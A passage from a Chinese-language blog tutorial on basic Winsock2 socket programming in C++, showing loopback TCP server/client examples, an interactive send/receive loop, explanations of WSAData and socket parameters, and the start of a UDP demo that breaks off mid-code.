recv和send</li></ul><p><strong>套接字需要手动关闭，包括socket环境也要清理</strong><br>现今所用的头文件应该都是<code>Winsocke2.h</code>了<br>另外注意目前还是使用ipv4为主</p><p>先搞个最简单的收发</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">WSAData wsa;</span><br><span class="line">SOCKET m_server;</span><br><span class="line">SOCKET m_client;</span><br><span class="line">SOCKADDR_IN serAddr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化winsock2.2版本</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wsastartup error!\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">m_server = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == m_server) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//网络地址信息</span></span><br><span class="line">serAddr.sin_family = AF_INET;</span><br><span class="line">serAddr.sin_port = <span class="built_in">htons</span>(<span class="number">7985</span>);</span><br><span class="line">serAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//套接字和地址绑定</span></span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">bind</span>(m_server, (sockaddr*)&amp;serAddr, <span class="built_in">sizeof</span>(SOCKADDR_IN));</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//套接字监听</span></span><br><span class="line">ret = <span class="built_in">listen</span>(m_server, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;listen error\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//挂起等待客户端连接</span></span><br><span class="line"><span class="type">int</span> cli_Size = <span class="built_in">sizeof</span>(sockaddr_in);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == (m_client = <span class="built_in">accept</span>(m_server, (sockaddr*)&amp;serAddr, &amp;cli_Size))) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有连接之后发送个数据过去</span></span><br><span class="line"><span class="type">char</span> sendBuf[MAX_PATH] = <span class="string">&quot;hello client&quot;</span>;<span class="comment">//发送数据缓冲区</span></span><br><span class="line"><span class="built_in">send</span>(m_client, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server sendbuf！\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结束退出</span></span><br><span class="line"><span class="built_in">closesocket</span>(m_server);</span><br><span class="line"><span class="built_in">closesocket</span>(m_client);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">WSAData wsa;</span><br><span class="line">SOCKET m_sock;</span><br><span class="line">sockaddr_in addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化网络环境</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wsastartup error!\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字，流对象，协议Tcp</span></span><br><span class="line">m_sock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == m_sock) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置完地址之后尝试连接</span></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = <span class="built_in">htons</span>(<span class="number">7985</span>);</span><br><span class="line">addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(m_sock, (sockaddr*)&amp;addr, <span class="built_in">sizeof</span>(sockaddr_in))) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect error!\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收服务端数据</span></span><br><span class="line"><span class="type">char</span> recvBuf[MAX_PATH] = <span class="string">&quot;&quot;</span>;<span class="comment">//接收数据缓冲区</span></span><br><span class="line"><span class="built_in">recv</span>(m_sock, recvBuf, MAX_PATH, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;client recvbuf:%s\r\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭客户端</span></span><br><span class="line"><span class="built_in">closesocket</span>(m_sock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在visual studio 上跑就行，分开两个项目只是为了更好理解，如果抽象能力足够，放到一个项目下也行。<br>此外现在也只是单线程的工作收发就结束了还可以互动一下。</p></blockquote><p><strong>有个建议也是约定俗成的，就是if判断的时候把变量放在右边，常量放在左边。也就是上面代码if的时候的操作。虽然对于我们人类阅读有点不便，但是它可以防止最常见的错误<code>if(a=0)</code>，就是判断变成赋值的时候，这样子是合法的不报错但是偏离我们意愿了。改成<code>if(0=a)</code>编译器立马就能给出反应</strong></p><img src="/2022/10/25/tcp-ip/000.png" class=""><p>大致就是这样服务端因为send很快就结束了，客户端则是需要一丢丢时间收到数据然后打印出来<br>这里演示的是服务端发送，客户端接收。<br>那么相应的，一收一发也很简单，加个缓冲区和过程就行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//有连接之后发送个数据过去</span></span><br><span class="line"><span class="type">char</span> sendBuf[MAX_PATH] = <span class="string">&quot;hello client&quot;</span>;<span class="comment">//发送数据缓冲区</span></span><br><span class="line"><span class="built_in">send</span>(m_client, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server sendbuf！\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvBuf[MAX_PATH] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">recv</span>(m_client, recvBuf, <span class="built_in">sizeof</span>(recvBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server recv:%s\r\n&quot;</span>, recvBuf);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接收服务端数据</span></span><br><span class="line"><span class="type">char</span> recvBuf[MAX_PATH] = <span class="string">&quot;&quot;</span>;<span class="comment">//接收数据缓冲区</span></span><br><span class="line"><span class="built_in">recv</span>(m_sock, recvBuf, MAX_PATH, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;client recvbuf:%s\r\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> sendBuf[MAX_PATH] = <span class="string">&quot;hello server&quot;</span>;<span class="comment">//发送数据缓冲区</span></span><br><span class="line"><span class="built_in">send</span>(m_sock, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;client sendbuf！\r\n&quot;</span>);</span><br></pre></td></tr></table></figure><img src="/2022/10/25/tcp-ip/001.png" class=""><p>甚至无聊点还可以<code>while(true)</code>持续的收发收发。那么到此基础的网络就形成了</p><ol><li>关于变量命名，驼峰和匈牙利命名法可以多学习</li><li>判断的时候右值放前面有助于写错或者忘记，虽然可能不习惯，这个无伤大雅</li><li>加个sleep是怕套接字挂的太快哈哈，实际应该没啥大事</li></ol><p>有关参数我这也粗略描写，具体你在vs上让光标处于这个函数上然后按f1可以跳转到微软的文档，有些可能有中文，没有的就需要翻译一下了。</p><p>关于WSAData，本质是一个结构体，微软都会做一些区分，咱这默认就用两个WORD那个就行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">WSAData</span> &#123;</span><br><span class="line">        WORD                    wVersion;</span><br><span class="line">        WORD                    wHighVersion;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxSockets;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxUdpDg;</span><br><span class="line">        <span class="type">char</span> FAR *              lpVendorInfo;</span><br><span class="line">        <span class="type">char</span>                    szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>                    szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">char</span>                    szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>                    szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxSockets;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxUdpDg;</span><br><span class="line">        <span class="type">char</span> FAR *              lpVendorInfo;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; WSADATA, FAR * LPWSADATA;</span><br></pre></td></tr></table></figure><p>在文档中，微软也有示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"> </span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>( <span class="number">2</span>, <span class="number">2</span> );</span><br><span class="line"> </span><br><span class="line">err = <span class="built_in">WSAStartup</span>( wVersionRequested, &amp;wsaData );</span><br><span class="line"><span class="keyword">if</span> ( err != <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line">    <span class="comment">/* WinSock DLL.                                  */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们也可以直接缩写成<code>WSAStartup(MAKEWORD(2, 2), &amp;wsa)</code>。<br>关于版本在 wHighVersion 成员中返回的 Windows 套接字规范的当前版本<br>WSADATA 结构是版本 2.2，编码为低字节中的主版本号和高字节中的次要版本号。 此版本的当前 Winsock DLL （Ws2_32.dll）支持请求以下任意版本的 Windows 套接字规范的应用程序：</p><ul><li>1.0</li><li>1.1</li><li>2.0</li><li>2.1</li><li>2.2</li></ul><p>关于SOCKET，也是个小问题，微软会对一些类型命名成全大写的存在</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SOCKET WSAAPI <span class="title">socket</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span> af,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span> type,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span> protocol</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数1位地址簇规范，即ipv4和ipv6，可能有点小区别，见文档<br>参数2表示套接字类型，一般都用流，反正这些基本都是预定义的宏，稍微记住就行。<br>参数3位使用协议，咱这因为是tcp演示，就指明是tcp了。默认为0，代表服务提供者自动协商。</p><p>关于sockaddr_in，通过代码，应该明确知道就是存放地址细节的一个结构体<br>参数1，根据注释此成员应该一直为AF_INET，后续的socket创建也有这个<br>参数2，就是端口号<br>参数3，就是ip的点分十进制方法</p><p><strong>ok，只要你能自己尝试写一下，然后看看这些参数，翻阅文档，那么基本使用套接字就没啥问题了</strong></p><p>然后就是最基本的一问一答，你也可以设置关键字退出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">//接收数据</span></span><br><span class="line">    <span class="built_in">recv</span>(m_client, recvBuf, MAX_PATH, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//判断是否触发关键字</span></span><br><span class="line">    <span class="keyword">if</span> (recvBuf[<span class="number">0</span>] == <span class="string">&#x27;q&#x27;</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;client quit!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;client msg:%s\r\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;server:&quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; sendBuf;</span><br><span class="line">    <span class="comment">//发送</span></span><br><span class="line">    <span class="built_in">send</span>(m_client, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;server sendbuf！\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;client:&quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; sendBuf;</span><br><span class="line">    <span class="comment">//发送</span></span><br><span class="line">    <span class="built_in">send</span>(m_sock, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//判断是否输入关键字</span></span><br><span class="line">    <span class="keyword">if</span> (sendBuf[<span class="number">0</span>] == <span class="string">&#x27;q&#x27;</span> &amp;&amp; <span class="built_in">strlen</span>(sendBuf) &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;client quit!\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;client sendbuf！\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收服务端数据</span></span><br><span class="line">    <span class="built_in">recv</span>(m_sock, recvBuf, MAX_PATH, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;server msg:%s\r\n&quot;</span>, recvBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/10/25/tcp-ip/002.png" class=""><blockquote><p>相似的步骤不做赘述，只看看关键的地方<br>除了基础类型char，也可以使用cpp的string类，那个自带个size倒是方便点<br>还有就是，服务端的特性，他不会主动连接，所以对于send，第一次肯定是客户端发起的，服务器启动后的事就是等待消息</p></blockquote><p><strong>比较抱歉的就是，c和cpp混用习惯了写代码老会混用，会努力改变这个不好的习惯</strong></p><p>上述的操作都是一对一，服务端没有办法同时连接多个客户端，最好的办法就是通过多线程，服务端能处理更多的连接。<br>多线程此处就不做演示了。</p><hr><h3 id="udp的demo"><a href="#udp的demo" class="headerlink" title="udp的demo"></a>udp的demo</h3><p>udp的服务器</p><ul><li>创建套接字</li><li>bind</li><li>recvfrom</li><li>sendto</li><li>关闭套接字</li></ul><p>udp的客户端</p><ul><li>创建套接字</li><li>sendto</li><li>recvfrom</li><li>关闭套接字</li></ul><blockquote><p>相比tcp，udp不需要监听然后去等连接请求，而是绑定完端口ip之后直接收发</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">SOCKET m_sock;</span><br><span class="line">SOCKADDR_IN m_addr;</span><br><span class="line">SOCKADDR_IN m_cliAddr;</span><br><span class="line"><span class="type">int</span> m_cliAddrLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化网络环境</span></span><br><span class="line">WSADATA wsa;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa)) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wsastartup error!\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化套接字对象</span></span><br><span class="line">m_sock = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == m_sock) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(m_sock);</span><br><span class="line">m_sock = INVALID_SOCKET;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置地址端口</span></span><br><span class="line">m_addr.sin_family = AF_INET;</span><br><span class="line">m_addr.sin_port = <span class="built_in">htons</span>(<span class="number">9527</span>);</span><br><span class="line">m_addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">bind</span>(m_sock, (sockaddr*)&amp;m_addr, <span class="built_in">sizeof</span>(sockaddr_in));</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == ret) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(m_sock);</span><br><span class="line">m_sock = INVALID_SOCKET;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//收发</span></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">1024</span>] = <span class="string">&quot;由服务端发送&quot;</span>;</span><br><span class="line"><span class="built_in">recvfrom</span>(m_sock, recvBuf, <span class="number">1024</span>, <span class="number">0</span>, (sockaddr*)&amp;m_cliAddr, &amp;m_cliAddrLen);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;server recv：&quot;</span> &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">sendto</span>(m_sock, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>, (sockaddr*)&amp;m_cliAddr, m_cliAddrLen);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;server send success!\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">closesocket</span>(m_Socket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">SOCKET m_sock;</span><br><span class="line">SOCKADDR_IN m_addr;</span><br><span class="line"><span class="type">int</span> m_addrLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化网络环境</span></span><br><span class="line">WSADATA 